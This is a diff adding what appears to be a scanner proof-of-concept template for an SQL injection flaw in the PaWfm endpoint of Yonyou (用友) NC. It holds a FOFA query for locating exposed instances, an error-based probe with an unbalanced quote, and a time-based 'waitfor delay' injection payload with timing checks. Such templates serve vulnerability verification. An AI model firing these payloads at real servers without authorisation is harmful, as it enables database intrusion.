@@ -1,0 +1,21 @@
+id: poc-yaml-yongyou-nc-pawfm-sqli
+info:
+  name: 用友 NC PaWfm SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /portal/pt/PaWfm/open?pageId=login&proDefPk=11'
+  expression: status_code == 500 && contains(body,"sql:") && contains(body,"字符串 '11''
+    后的引号不完整")
+- method: GET
+  path: /portal/pt/PaWfm/open?pageId=login&proDefPk=11';waitfor+delay+'0:0:{{.t1}}'--
+  expression: "status_code == 200 && \ncontains(body,\"<Url>@NOPRODEF@</Url>\") &&\n\
+    contains(body,\"?xml version=\") &&\nduration > t1 &&\nduration < t2\n"
+transport: http
